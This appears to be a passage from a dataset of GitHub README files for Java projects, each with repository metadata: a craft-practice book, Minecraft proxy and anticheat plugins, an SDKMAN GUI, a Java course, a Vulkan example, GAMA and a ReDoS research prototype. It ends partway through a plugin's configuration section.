We wouldn't want your craft skills to go to waste !

## About this repository

As with the Advent of Craft edition, the PDF of the Summer Craft Book comes with this github repository. Each exercise and most of the games are in it, so you could use the repository standalone.

We understand you could be busy in the summer and want to just do the practice so don't hesitate to do just that !

![Summer of Craft](docs/img/summer-of-craft.webp)

## The Book
You can grab your copy of our `Summer Craft Book` here:
- [Digital copy](https://drive.google.com/file/d/16BrF17jEMr6Sleonnq6xSafWMHA5_q1Y/view?usp=drive_link)
- [Printable version](https://drive.google.com/file/d/1yG6ALvJyf3y5LCWF38VlzW7D2APaGZRK/view?usp=sharing)

[![Summer Craft Book](docs/img/cover.webp)](https://drive.google.com/file/d/16BrF17jEMr6Sleonnq6xSafWMHA5_q1Y/view?usp=drive_link)

### Miro board
Alternatively, you can use the miro board template available [here](https://miro.com/app/board/uXjVK056f4o=/?share_link_id=201408685412) or by using the backup file available [here](https://drive.google.com/file/d/1laWnvAk8AnQ00QlaepzF3hTO2a8UR-Wg/view?usp=sharing).

[![Miro board](docs/img/miro-board.webp)](https://miro.com/app/board/uXjVK056f4o=/?share_link_id=201408685412)

## Summary
- [Week 1: Code Analysis.](/docs/01-code-analysis/week01.md)
- [Week 2: Object Calisthenics.](/docs/02-object-calisthenics/week02.md)
- [Week 3: Command Query Separation.](/docs/03-cqs/week03.md)
- [Week 4: Test Driven Development.](docs/04-tdd/week04.md)
- [Week 5: Accidental Complexity.](docs/05-complexity/week05.md)
- [Week 6: Legacy Code.](docs/06-legacy-code/week06.md)
- [Week 7: Property-based Testing.](docs/07-pbt/week07.md)

## Join us on Discord

To facilitate the communication and share your ideas around the different weeks, we invite you to join our `Discord` by simply clicking [here](https://discord.gg/E5Z9s9UKTS).

[![Discord Advent Of Craft](docs/img/discord.webp)](https://discord.gg/E5Z9s9UKTS)

## Available languages
Here are the supported programming languages: `java`, `C#`, `kotlin`, `typescript`.",0,0,1,0.0,"['summer', 'craft', 'book', 'one', 'theme', 'week', 'about', 'repository', 'the', 'book', 'miro', 'board', 'summary', 'join', 'u', 'discord', 'available', 'language']","['book', 'summer', 'craft', 'one', 'theme']",26.0,"[maven-compiler-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,24.0,2.0
ThomasOM/Dusk,master,"# Dusk
Server-side anticheat essentials for Minecraft 1.8
Uses transactions to track client state with [Pledge](https://github.com/ThomasOM/Pledge)

# Features
- Highly accurate range check detecting the lowest reach possible, anything above `3.00075` (Small error due to fast math)
- Optimal timing check detecting when users run their game faster than the server time
- Lag independent, users with bad connection do not cause any checks to false

# Important Notes
- This is only functional for Minecraft 1.8 and does not support any versions above or below
- All checks have been tested locally by using [clumsy](https://github.com/jagt/clumsy) to simulate network lag
- Not sure if I missed something... If I did, feel free to open an issue or a pull request!
",0,0,3,2.0,"['dusk', 'feature', 'important', 'note']","['dusk', 'feature', 'important', 'note']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,1.0,0.0
HaHaWTH/HAProxy-Detector,master,"# HAProxyDetector-Fork

[![](https://img.shields.io/github/downloads/HaHaWTH/HAProxy-Detector/total?style=for-the-badge)](https://github.com/HaHaWTH/HAProxy-Detector/releases) [![](https://img.shields.io/github/license/HaHaWTH/HAProxy-Detector?style=for-the-badge)](https://github.com/HaHaWTH/HAProxy-Detector/blob/master/LICENSE) [![](https://img.shields.io/bstats/servers/21070?label=Spigot%20Servers&style=for-the-badge)](https://bstats.org/plugin/bukkit/HAProxyDetector/21070) [![](https://img.shields.io/bstats/servers/12605?label=BC%20Servers&style=for-the-badge)](https://bstats.org/plugin/bungeecord/HAProxyDetector/12605) [![](https://img.shields.io/bstats/servers/14442?label=Velocity%20Servers&style=for-the-badge)](https://bstats.org/plugin/velocity/HAProxyDetector/14442)

This [BungeeCord](https://github.com/SpigotMC/BungeeCord/) (and now [Spigot](https://www.spigotmc.org/wiki/spigot/)
and [Velocity](https://papermc.io/software/velocity/)) plugin enables proxied and direct connections both at the same time. More
information about [HAProxy](https://www.haproxy.org/) and its uses can be
found [here](https://github.com/MinelinkNetwork/BungeeProxy/blob/master/README.md).

**Originally made by Andylizi**

**This plugins requires Java11 or higher!**

## Security Warning

Allowing both direct and proxied connections has significant security implications â€” a malicious player can access the
server through their own HAProxy instance, thus tricking the server into believing the connection is coming from a
fake IP.

To counter this, this plugin implements IP whitelisting. **By default, only proxied connections from `localhost` will be
allowed** (direct connections aren't affected). You can add the IP/domain of your trusted HAProxy instance by
editing `whitelist.conf`, which can be found under the plugin data folder.

<details>
    <summary>Details of the whitelist format</summary>

```
# List of allowed proxy IPs
#
# An empty whitelist will disallow all proxies.
# Each entry must be an valid IP address, domain name or CIDR.
# Domain names will be resolved only once at startup.
# Each domain can have multiple A/AAAA records, all of them will be allowed.
# CIDR prefixes are not allowed in domain names.

127.0.0.0/8
::1/128
```

If you want to disable the whitelist (which you should never do), you can do so by
putting this line verbatim, before any other entries:

```
YesIReallyWantToDisableWhitelistItsExtremelyDangerousButIKnowWhatIAmDoing!!!
```

</details>

## Platform-specific Notes

#### BungeeCord

`proxy_protocol` needs to be enabled in BC `config.yml` for this plugin to work. (Not to be confused with the similar option in `paper.yml`)

Older versions of BC can in theory use [BungeeProxy](https://github.com/MinelinkNetwork/BungeeProxy) in parallel
with this plugin, but it hasn't been tested yet. Feedback is welcomed.

#### Spigot and its derivatives

[ProtocolLib](https://www.spigotmc.org/resources/protocollib.1997/) is a required dependency.
This plugin was developed using ProtocolLib 5.0.

#### Paper

New versions of Paper have built-in HAProxy support (proxied connection only). It's not compatible with this plugin, so please disable the `proxy-protocol` option in `paper.yml`.

#### Velocity

`haproxy-protocol` needs to be enabled in Velocity config for this plugin to work.

Versions older than 3.0 are not supported.

#### Java >= 9

**No need to use this, ImagineBreaker has already wiped it**

If errors like `NoClassDefFoundError: sun.misc.Unsafe`, `InaccessibleObjectException` and such are encountered,
please add `--add-opens java.base/java.lang.invoke=ALL-UNNAMED` to JVM arguments.

#### Java >= 18

**No need to use this, ImagineBreaker has already wiped it**

If errors like `IllegalAccessException: static final field has no write access` are encountered,
please upgrade the plugin to at least v3.0.2.

If you cannot upgrade for whatever reason, a temporary workaround would be to add
`-Djdk.reflect.useDirectMethodHandle=false` to JVM arguments.

Note that this argument will be removed in future Java releases.

## Metrics

This plugin uses [bStats](https://bStats.org) for metrics. It collects some basic information, like how many people
use this plugin and the total player count. You can opt out at any time by editing the config file under
`plugins/bStats/`.
",1,0,1,0.0,"['security', 'warn', 'list', 'allow', 'proxy', 'ip', 'an', 'empty', 'whitelist', 'disallow', 'proxy', 'each', 'entry', 'must', 'valid', 'ip', 'address', 'domain', 'name', 'cidr', 'domain', 'name', 'resolve', 'startup', 'each', 'domain', 'multiple', 'record', 'allow', 'cidr', 'prefix', 'allow', 'domain', 'name', 'note', 'bungeecord', 'spigot', 'derivative', 'paper', 'velocity', 'java', 'java', 'metric']","['domain', 'allow', 'name', 'proxy', 'ip']",1.0,"[maven-compiler-plugin,maven-jar-plugin,maven-shade-plugin,maven-surefire-plugin]",0.0,1.0,0.0
jagodevreede/sdkman-ui,main,"# sdkman-ui

This project aims to offer a Graphical User Interface for [SDKMAN](https://sdkman.io/).

> [!NOTE]  
> Primary focus for now is to create a UI for windows, other OS's will come later.
> Also only Java and Maven candidates are available in the first version, other candidates will be added later.

## Screenshots

<p align=""center"">
    <img height=""150"" src=""https://jagodevreede.github.io/sdkman-ui-images/gallery1.png"" />
    <img height=""150"" src=""https://jagodevreede.github.io/sdkman-ui-images/gallery2.png"" />
</p>

## Requirements

tar, unzip and zip should be present on the system. You can install them with your favourite package manager on *inx
systems.

### Windows:

Zip and unzip are bundled with the application, if they are on the path then skdman-ui will use those if not then it
will use the bundled versions:

- tar: no need for tar as it is not used on windows
- zip: [https://gnuwin32.sourceforge.net/packages/zip.htm](https://gnuwin32.sourceforge.net/packages/zip.htm)
  or [direct download](http://downloads.sourceforge.net/gnuwin32/zip-3.0-bin.zip)
- unzip: [https://gnuwin32.sourceforge.net/packages/unzip.htm](https://gnuwin32.sourceforge.net/packages/unzip.htm)
  or [direct download](https://gnuwin32.sourceforge.net/downlinks/unzip-bin-zip.php)

## Available platforms

Some platforms are not yet available as they are not yet setup and/or tested.

| Platform    | Available                                                                                                       | Supported envirmoments |
|-------------|-----------------------------------------------------------------------------------------------------------------|------------------------|
| Windows x86 | [v0.0.3](https://github.com/jagodevreede/sdkman-ui/releases/download/v0.0.3/sdkman-ui-windows_x86_64-0.0.3.zip) | cmd        |
| Linux x86   |                                                                                                                 | bash, zsh              |      
| Linux arm   |                                                                                                                 | bash, zsh              |
| osx x86     |                                                                                                                 | bash, zsh              |
| osx arm     |                                                                                                                 | bash, zsh              |

Early access builds can be found here: [releases/tag/early-access](https://github.com/jagodevreede/sdkman-ui/releases/tag/early-access)

## Install instructions

### Windows

Download the latest version and extract the zip, then run the `sdkman-ui.exe`. And follow on screen instructions. Then
it should be available from the commandline as `sdkui`.

Also see the following [video](https://www.youtube.com/watch?v=oyYtHrihThk)

#### Symlinks

Most versions of Windows do not allow the creation on symlinks by default, SDKMAN UI will work
around that by using copy, however this is a lot slower. You can enable development mode in windows
see [https://learn.microsoft.com/en-us/windows/apps/get-started/enable-your-device-for-development](https://learn.microsoft.com/en-us/windows/apps/get-started/enable-your-device-for-development)
for more information.

## build steps:

- `sdk u java 22.1.0.1.r17-gln` or manually install from https://github.com/gluonhq/graal/releases
- `export GRAALVM_HOME=$JAVA_HOME`
- `./mvnw clean install -DskipTests`

Native:

To update native reflections `gluonfx:runagent`
`./mvnw gluonfx:build -f sdkman-ui`

Jlink:

-`./mvnw javafx:jlink -f sdkman-ui`

run with: `./sdkman-ui/target/sdkmanui/bin/launcher`

## Run as developer:

Run the following class:
`io.github.jagodevreede.sdkmanui.Main`

## Design decisions

See [DESIGN_DECISIONS.md](DESIGN_DECISIONS.md)",5,7,6,7.0,"['screenshots', 'requirement', 'window', 'available', 'platform', 'install', 'instruction', 'window', 'symlinks', 'build', 'step', 'run', 'developer', 'design', 'decision']","['window', 'screenshots', 'requirement', 'available', 'platform']",4.0,"[com.gluonhq:gluonfx-maven-plugin,com.googlecode.maven-download-plugin:download-maven-plugin,net.revelc.code.formatter:formatter-maven-plugin,org.apache.maven.plugins:maven-antrun-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.openjfx:javafx-maven-plugin]",0.0,3.0,1.0
AkashKobal/java-full-stack-developement,main,"# java-full-stack-developement  
## ğŸ—’ï¸ Description     
    
This advanced-level repository equips learners with the necessary skills to excel in full-stack development using Java, with a focus on fostering employability skills. learners will delve into the key technologies integral to full-stack development, primarily centered around Java and its associated tools and frameworks such as Java EE, Java Persistence, Hibernate, Maven, and Spring Core. Upon successful completion of the repository, learners will be well-prepared to pursue a career in full-stack development, armed with a comprehensive understanding of Java-based technologies and problem-solving capabilities.

## Content's 
## Calculator _(HTML, CSS, Java)_      
![alt text](https://github.com/AkashKobal/java-full-stack-developement/blob/main/Calculator/output.png)      
 
 
## What you'll learn  
- Build a fully functioning web application through a simplistic step from a professional trainer<br>  
- Java programming language 
- Learn Java server pages, servlets, and JSTL from the basics to advance
- Understand building web forms with JSP  
- Apply validations on the forms
- Use the web template to make the web application incredible 
- Create-Deploy Servlets & Understand Servlet Lifecycle 
- Learn how to Handle Session in JSP
- Develop Dynamic Web Applications
- Learn MVC in JSP
- Forms under JSP and Servlets
- Collection
- Learn the concept related to Generics
- Add validations on form data
- Adding records into the database
- Updating record(s) into database
- Deleting record(s) into database
- Spring Framework
- Web Services â€“ RestFul API
- Spring Boot
- Spring Boot Restful API
- JavaScript

## Repository Overview
### Java Fundamentals

- Explore the intricacies of decision-making in Java.
- Master object-oriented programming concepts for efficient code organization.
- Dive into the powerful Collections framework and debugging techniques.
- Harness the flexibility of Generics for enhanced code reusability.
- Conquer the complexities of multi-threading and understand Lambdas for concise, functional programming.
- Gain proficiency in file handling to manage data seamlessly.

### Web Development with JSP and Servlets

- Learn to build interactive web forms using JSP.
- Implement form validations for a seamless user experience.
- Develop and deploy Java Servlets for dynamic web applications.
- Understand session management in JSP for enhanced user interactions.
- Explore database integration: add, update, and delete records effortlessly.
- Master the art of image and file uploads for versatile web applications.

### Hibernate for Database Operations

- Establish a robust connection between Hibernate and databases.
- Delve into Hibernate Query Language (HQL) basics.
- Perform CRUD operations seamlessly with Hibernate.

### Spring Framework & REST API Overview

- Grasp the concept of Inversion of Control (IoC) for flexible application architecture.
- Dive into Spring Beans for modular and scalable development.
- Utilize resource-based URIs for CRUD methods and handle JSON responses.
- Implement HATEOAS principles for resource discoverability.
- Ensure the idempotence of HTTP methods for robust APIs.

### Spring Boot Mastery

- Navigate the seamless transition from Spring Boot 2.7 to Spring Boot 3 migrations.
- Enhance your applications by integrating Spring Security, Thymeleaf tags, and Restful APIs into Spring Boot projects.
- Implement validations in the Register Form and introduce a sleek Profile page on the Blog application.
- Incorporate user account support to elevate your Spring applications.
- Implement JWT token generation for secure authentication.
- Integrate the H2 database seamlessly.
- Explore web template integration for polished user interfaces.
- Strengthen application security with Spring Security and Bcrypt password hashing.
- Develop functionalities like profile updates and password reset emails.

### JavaScript
- Master keywords and data types in JavaScript.
- Differentiate between normal functions and expression functions.
- Harness the power of forEach method for efficient array processing.
- Gain proficiency in DOM manipulation and understand callback functions.

### JUnit :
- Gain a solid understanding of the fundamentals of the JUnit testing framework.
- Learn how to structure and implement effective JUnit test methods for robust and reliable testing.
- Explore techniques for testing exceptions, ensuring your code handles unexpected scenarios seamlessly.

### Micro-Web Services and JSTL:
- Dive into the legacy content of micro-web services, exploring both basic and advanced concepts.
- Master the intricacies of JavaServer Pages Standard Tag Library (JSTL) for efficient web development.

### Bonus Modules:
- Explore Docker and WSL on Windows for containerized development.
- Implement OAuth2 with JWT token generation for secure authentication.
- Develop Album API with Spring Boot.

### Key Learning Objectives
- Java Fundamentals: Master core Java concepts, including multi-threading, Lambdas, Collections framework, and file handling.
- Hibernate: Explore Hibernate, learn to build applications using JSP and Hibernate, and perform CRUD operations.
- Spring Framework: Dive into the Spring framework, covering Inversion of Control, Dependency Injection, and more.
- Spring Boot: Gain in-depth knowledge of Spring Boot, covering migrations, security integration, Thymeleaf tags, and Restful API implementation.
- JavaScript Basics: Understand essential JavaScript concepts, including objects, loops, decision-making, array methods, and asynchronous JavaScript.

### Repository Features
- Understand the end-to-end process of building web forms with JSP and Servlets.
- Acquire a strong foundation in object-oriented programming, covering core concepts, method parameters, return types, arrays, collections, and debugging.
- Implement sessions in JSP for efficient web application management.
- Apply a wide range of concepts to projects, allowing you to practice and reinforce your new skills.

This README serves as a comprehensive guide for learners enrolled in the repository, outlining the curriculum's objectives, technologies covered, and skills developed throughout the program.
",1,0,23,23.0,"['description', 'content', 'calculator', 'html', 'cs', 'java', 'what', 'learn', 'repository', 'overview', 'java', 'fundamental', 'web', 'development', 'jsp', 'servlets', 'hibernate', 'database', 'operation', 'spring', 'framework', 'rest', 'api', 'overview', 'spring', 'boot', 'mastery', 'javascript', 'junit', 'service', 'jstl', 'bonus', 'module', 'key', 'learning', 'objective', 'repository', 'feature']","['java', 'repository', 'overview', 'spring', 'description']",2.0,[],0.0,2.0,0.0
chengenzhao/java-vulkan-mac,master,"# Java Vulkan Example  

![Screenshot2024-03-31 18 19 12](https://github.com/chengenzhao/java-vulkan-mac/assets/5525436/7ff3454b-cde6-468c-9e27-72900bd08667)

# Requirement:  

* Java 22
* Vulkan macOS version should be installed, you may get Vulkan SDK here: https://vulkan.lunarg.com/sdk/home
* Make sure set up the environment after installation, typically in your .zshrc you may need following variables:
```shell
export JAVA_HOME=~/JDK/jdk-22.jdk/Contents/Home
export VULKAN_SDK=~/VulkanSDK/1.3.280.1/macOS
export PATH=$JAVA_HOME/bin:$VULKAN_SDK/bin:$PATH
export DYLD_LIBRARY_PATH=$VULKAN_SDK/lib:$DYLD_LIBRARY_PATH
export VK_ICD_FILENAMES=$VULKAN_SDK/share/vulkan/icd.d/MoltenVK_icd.json
export VK_LAYER_PATH=$VULKAN_SDK/share/vulkan/explicit_layer.d
```

# SDK Versions 

* Java SDK(JDK) 22
* VulkanSDK 1.3.280.1

# How to run it?
* Install Vulkan SDK, make sure the environment variables are set.
* Run the main class: com.example.HelloApplication.
![Screenshot2024-04-02 17 11 26](https://github.com/chengenzhao/java-vulkan-mac/assets/5525436/dafef8ea-421f-4408-a7d4-32013a1e2435)

# How to generate vulkan_h.java and compile the shaders? 
There are some generated source code and compiled shaders in the src directory, here is the way I made them:
* Using jextract to generate corresponding java files of vulkan.h, jextract command(in your $VulkanSDK directory): 
```shell
$jextract/bin/jextract -I ""./include"" -D ""VK_USE_PLATFORM_MACOS_MVK"" -D ""VK_USE_PLATFORM_METAL_EXT"" -D ""_MACOS"" -t org.vulkan $VULKAN_SDK/include/vulkan/vulkan.h
```
* Compile the shader files, which included in the src/main/resources/shader folder. Using command like:
```shell
$VULKAN_SDK/bin/glslc src/main/resources/shader/shader.vert -o src/main/resources/shader/vert.spv
$VULKAN_SDK/bin/glslc src/main/resources/shader/shader.frag -o src/main/resources/shader/frag.spv
```

# Distribution / Releasing on Steam etc.

For using Vulkan in Java program there are two requirements:

## 1) Following files in the $Vulkan_SDK/macOS/lib should be included in the Java Library Path

1) libMoltenVK.dylib
2) libvulkan.1.3.280.dylib
3) libvulkan.1.dylib
4) libvulkan.dylib

### Choose one of following options:
* (Recommended) Manually copy above 4 files to $JAVA_HOME/lib directory.     

or
* Using option: 
```shell
-Djava.library.path=$VULKAN_SDK/lib
```
check following Swift code.

## 2) Setting environment variables is also required
Manually typing in export environment variables for development is OK, but could be difficult for production environment e.g. releasing on Steam.  
Traditionally we could write a script like zsh script or shell script to set the environment variables first then start the Java program using java command.  
However with tools provided by Apple, we could use Swift to do the similar job.     
A typical Swift wrapper code like:
```swift
import Foundation

let task = Process()

let currentPath = FileManager.default.currentDirectoryPath

//environment variables, make sure copy the share directory in $VULKAN_SDK to the root directory of distribution 
task.environment = [
    ""VK_DRIVER_FILES"":""\(currentPath)/share/vulkan/icd.d/MoltenVK_icd.json"",
    ""VK_LAYER_PATH"":""\(currentPath)/share/vulkan/explicit_layer.d""
]
//path to your JAVA_HOME/bin/java
task.launchPath = ""\(currentPath)/bin/java""
//options, main class and arugments
let moduleName = ""demo""
let mainClass = ""com.example.HelloApplication""
let jarName = ""demo.jar""
//-Djava.library.path also goes here e.g. [""-Djava.library.path=\(vulkanSDKLibPath)/lib"",...
task.arguments = [""--enable-native-access=\(moduleName)"",""-p"",""\(jarName)"",""-m"",""\(moduleName)/\(mainClass)""]

task.standardInput = nil
task.launch()

task.waitUntilExit()
```
Compile it, then you will get a starting binary executable file which could be used in Steam launch options.  
Don't forget copy the share directory in $VULKAN_SDK to the root directory of distribution. 

## 3) Custom Java runtime may also be required.
JavaFX is native dependency thus for distribution, developers need generate custom runtime for it.    
Using jlink and javafx-maven-plugin and javafx:jlink to generate the custom runtime.

# Basic Ideas

https://mail.openjdk.org/pipermail/openjfx-dev/2021-February/028861.html",0,0,1,0.0,"['java', 'vulkan', 'example', 'requirement', 'sdk', 'version', 'how', 'run', 'it', 'how', 'generate', 'compile', 'shaders', 'distribution', 'releasing', 'steam', 'etc', 'follow', 'file', 'include', 'java', 'library', 'path', 'choose', 'one', 'follow', 'option', 'set', 'environment', 'variable', 'also', 'require', 'custom', 'java', 'runtime', 'may', 'also', 'require', 'basic', 'idea']","['java', 'how', 'follow', 'also', 'require']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.openjfx:javafx-maven-plugin]",0.0,1.0,0.0
gama-platform/gama,2024-06,"# GAMA 2024-06 - Next release of GAMA

Due to several bugfixes in the recent versions of SWT, the _highly recommended configuration_ for working on this branch is  [Eclipse for Java and DSL 2024-06](https://www.eclipse.org/downloads/packages/release/2024-06/r/eclipse-ide-java-and-dsl-developers) and the [Temurin distribution of JDK21](https://adoptium.net).


[![Continuous project validation](https://github.com/gama-platform/new.gama/actions/workflows/trigger-compilation.yaml/badge.svg)](https://github.com/gama-platform/gama/actions/workflows/trigger-compilation.yaml)
[![Language](https://img.shields.io/badge/language-java-brightgreen.svg)](https://www.java.com/)
[![GitHub issues](https://img.shields.io/github/issues/gama-platform/gama.svg)](https://github.com/gama-platform/gama/issues)
[![Github Releases](https://img.shields.io/github/release/gama-platform/gama.svg)](https://github.com/gama-platform/gama/releases)
[![Documentation](https://img.shields.io/badge/documentation-web-brightgreen.svg)](https://gama-platform.github.io)

[![Maintainability Rating](https://sonarcloud.io/api/project_badges/measure?project=gama-platform_new.gama&metric=sqale_rating)](https://sonarcloud.io/summary/new_code?id=gama-platform_new.gama)

[![CodeScene general](https://codescene.io/images/analyzed-by-codescene-badge.svg)](https://codescene.io/projects/51964)
[![CodeScene Code Health](https://codescene.io/projects/51964/status-badges/code-health)](https://codescene.io/projects/51964)

**Core repository for the GAMA Platform project**
 
Please post issues about GAMA here: 
 
https://github.com/gama-platform/gama/issues 

Issues regarding the website (http://gama-platform.org) and the documentation should be posted here: 

https://github.com/gama-platform/gama-platform.github.io/issues

**See CHANGELOG.MD for a list of changes since version 1.9.0**  

 

 
 

  
  
  
",5,82,12,61.0,"['gama', 'next', 'release', 'gama']","['gama', 'next', 'release']",42.0,"[com.github.spotbugs:spotbugs-maven-plugin,maven-antrun-plugin,maven-deploy-plugin,maven-resources-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-jarsigner-plugin,org.apache.maven.plugins:maven-resources-plugin,org.codehaus.mojo:wagon-maven-plugin,org.eclipse.m2e:lifecycle-mapping,org.eclipse.tycho:target-platform-configuration,org.eclipse.tycho:tycho-compiler-plugin,org.eclipse.tycho:tycho-maven-plugin,org.eclipse.tycho:tycho-p2-director-plugin,org.eclipse.tycho:tycho-p2-repository-plugin]",0.0,0.0,1.0
d1tto/Rengar,master,"# Rengar

**Rengar** is the prototype of paper ""Effective ReDoS Detection by Principled Vulnerability Modeling and Exploit Generation"" published in S&P'23.",0,1,1,0.0,['rengar'],['rengar'],1.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin]",0.0,1.0,0.0
Kamesuta/BungeePteroPower,main,"# BungeePteroPower
![LogoArt](https://github.com/Kamesuta/BungeePteroPower/assets/16362824/e8914f79-806b-436c-a0e6-e4eaf8ad5eca)  
[![License: MIT](https://img.shields.io/github/license/Kamesuta/BungeePteroPower?label=License)](LICENSE)
[![Spigotmc Version](https://img.shields.io/spiget/version/114883?logo=spigotmc&label=Spigotmc%20Version)](https://www.spigotmc.org/resources/%E2%9A%A1-bungeepteropower-%E2%9A%A1-start-stop-servers-when-player-join-leave.114883/)
[![JitPack](https://img.shields.io/jitpack/version/com.github.Kamesuta/BungeePteroPower?logo=jitpack&label=JitPack)](https://jitpack.io/#Kamesuta/BungeePteroPower)  
[![Spigotmc Downloads](https://img.shields.io/spiget/downloads/114883?logo=spigotmc&label=Spigotmc%20Downloads)](https://www.spigotmc.org/resources/%E2%9A%A1-bungeepteropower-%E2%9A%A1-start-stop-servers-when-player-join-leave.114883/)
[![bStats Servers](https://img.shields.io/bstats/servers/20917?label=bStats%20Servers)](https://bstats.org/plugin/bungeecord/BungeePteroPower/20917)  

BungeePteroPower is a plugin that can automatically start/stop servers based on the number of players.  
It can start and stop servers on the [Pterodactyl panel](https://pterodactyl.io/) when players join or leave the Bungeecord proxy server.  
This helps to save server resources and manage servers more efficiently.  

https://github.com/Kamesuta/BungeePteroPower/assets/16362824/019fdfc5-f0fc-4532-89f3-3342b5812593

## Key Features

- Automatically stops servers using Pterodactyl's API when there are no players on the server for a certain period of time.
    - The time until shutdown can be configured for each server.
- Automatically starts servers using Pterodactyl's API when players join the server.
- Permissions settings allow for specifying players who can manually start servers and players for whom automatic startup is enabled upon joining.
- You can reset the server from a backup when it shuts down.
    - This is useful when creating mini-game servers that reset once played.

![Overview](https://github.com/Kamesuta/BungeePteroPower/assets/16362824/3cece79e-b41a-4119-a6cd-4800dd4f705d)

## Download

- You can download it from [Spigot](https://www.spigotmc.org/resources/%E2%9A%A1-bungeepteropower-%E2%9A%A1-start-stop-servers-when-player-join-leave.114883/) or [GitHub Releases](https://github.com/Kamesuta/BungeePteroPower/releases).

## Requirements

- Java 11 or higher
    - uses `java.net.http.HttpClient` in Java 11 for REST API communication with Pterodactyl.

## Getting Started

1. Obtain an API key in the Pterodactyl panel.
    - The client API key for Pterodactyl can be found in the ""API Credentials"" tab on the account page.
2. Add the plugin to the BungeeCord server and start it.
3. Configure the [Required Settings](#required-settings) in the generated `plugins/BungeePteroPower/config.yml` file.
    ```yml
    # Pterodactyl configuration
    pterodactyl:
      # The URL of your pterodactyl panel
      # If you use Cloudflare Tunnel, you need to allow the ip in the bypass setting.
      url: ""https://panel.example.com""
      # The client api key of your pterodactyl panel. It starts with ""ptlc_"".
      # You can find the client api key in the ""API Credentials"" tab of the ""Account"" page.
      apiKey: ""ptlc_000000000000000000000000000000000000000000""
    
    # Per server configuration
    servers:
      pvp:
        # Pterodactyl server ID
        # You can find the Pterodactyl server ID in the URL of the server page.
        # For example, if the URL is https://panel.example.com/server/1234abcd, the server ID is 1234abcd.
        id: 1234abcd
        # The time in seconds to stop the server after the last player leaves.
        # If you don't want to stop the server automatically, set it to -1.
        # If you set it to 0, the server will be stopped immediately after the last player leaves.
        timeout: 30
    ```
4. Reload the config with the `/ptero reload` command.
5. Configure the [Permission Settings](#permission-settings).  
    (You **MUST** configure permission to use this plugin, otherwise the player will not be able to do anything!)  
    You can use either of the following methods.  
    - Use a permission plugin like [LuckPerms](https://luckperms.net/).
        1. For LuckPerms, use the following commands to set permissions:
            ```
            # The player can start all servers
            /lp user <player_name> permission set ptero.autostart.*
            # The player can start specific server
            /lp user <player_name> permission set ptero.autostart.<server_name>
            # All players can start all servers
            /lp group default permission set ptero.autostart.*
            ```
            â€» `<player_name>` refers to the player's name, `<server_name>` refers to the server name specified in BungeeCord's `config.yml`.
    - Use built-in permission settings.
        1. Open `config.yml`.
        2. Add the following settings to the `config.yml` file.
            ```yml
            permissions:
                default:
                # All players can start all server
                - ptero.autostart.*
                # All players can start specific server
                - ptero.autostart.<server_name>
            ```  
            â€» `<server_name>` refers to the server name specified in BungeeCord's `config.yml`.
        3. Restart the BungeeCord server.
  
## Usage

### Automatic Startup

- Servers will automatically start when players attempt to join each server on BungeeCord.
    - This feature is available only to players with the `ptero.autostart.<server_name>` permission.

### Manual Start/Stop

- Use the `/ptero start <server_name>` command to manually start a server.
    - This command is available only to players with the `ptero.start.<server_name>` permission.
- Use the `/ptero stop <server_name>` command to manually stop a server.
    - This command is available only to players with the `ptero.stop.<server_name>` permission.

â€» `<server_name>` refers to the server name specified in BungeeCord's `config.yml`.

### Reloading config.yml/Language files

- Use `/ptero reload` to reload the config.yml and language files.

## Configuration

The `config.yml` file includes the following settings, but not all items need to be configured.

### Required Settings

- `pterodactyl`: Configure settings for Pterodactyl, including URL and API key.
    - `url`: Set the URL of your Pterodactyl panel. (Example: https://panel.example.com/)
        - If you are using services like Cloudflare Tunnel, ensure proper bypass settings for IP-based communication.
    - `apiKey`: Set the client API key for Pterodactyl.
        - It begins with `ptlc_`.
        - Client API keys for Pterodactyl can be found in the ""API Credentials"" tab on the account page.
- `servers`: Configure settings for each server. Set the server ID and the time until automatic shutdown.
    - `id`: Set the server ID on Pterodactyl.
        - Server IDs on Pterodactyl can be found in the URL of the server page.
        - For example, if the URL is https://panel.example.com/server/1234abcd, the server ID is 1234abcd.

### Optional Settings

- `version`: Set the version of the plugin.
    - When updating the plugin, a warning will be displayed if this value does not match the plugin version.
    - A `config.new.yml` file will be generated, and manual migration of settings using a merge tool is required.
    - After migration, please change this value to the new version.
- `checkUpdate`: Set whether to check for plugin updates. The default is `true`.
- `language`: Set the language to be used. The default is English (`en`).
    - Refer to the comments in the [config file](./src/main/resources/config.yml) for supported languages.
- `startTimeout`: After starting a server with this plugin, it will stop the server if there are no players for a certain period. The unit is seconds.
    - After starting, the server will stop after the `startTimeout` plus the server's timeout duration.
    - Setting it to 1 keeps the server running until players join and leave.
- `powerControllerType`: Set the type of power controller to be used.
    - The built-in PowerController currently supports only `pterodactyl`, which operates Pterodactyl.
    - By adding add-ons, you can add your own custom PowerController.
      Certainly! Here's the English translation of the provided description:
- `useSynchronousPing`: This setting determines whether to perform **synchronous** pinging to the server during login. (Experimental feature)
    - When enabled, pinging the server during login will happen synchronously rather than asynchronously.
    - This allows displaying BungeePteroPower messages (`join_autostart_login` in messages.yml) instead of the ""Could not connect to a default or fallback server"" message upon login.
    - The default value is `false`. Enabling this can be useful if you want to set servers (such as lobby servers) to a suspended state in BungeePteroPower immediately after login.
- `startupJoin`: After server startup, it is used to automatically join players to the server and check the server's status.
    - `timeout`: Set the maximum waiting time for players to join after server startup.
        - Set this value to the maximum time it takes for the server to start.
        - Setting it to 0 disables this feature, and players will not automatically join after startup.
    - `joinDelay`: Once the server is pingable, wait the specified amount of seconds before sending the player to the server
        - This is useful to wait for plugins like Luckperms to fully load
        - If you set it to 0, the player will be connected as soon as the server is pingable
    - `pingInterval`: Set the interval for checking the server's status.
- `restoreOnStop`: Configure settings for the feature to reset the server from a backup when it is stopped.
    - `timeout`: Set the maximum waiting time after sending the stop signal for the server to stop. (The restore will be performed after the server stops)
    - `pingInterval`: Set the interval for checking if the server is offline after sending the stop signal.
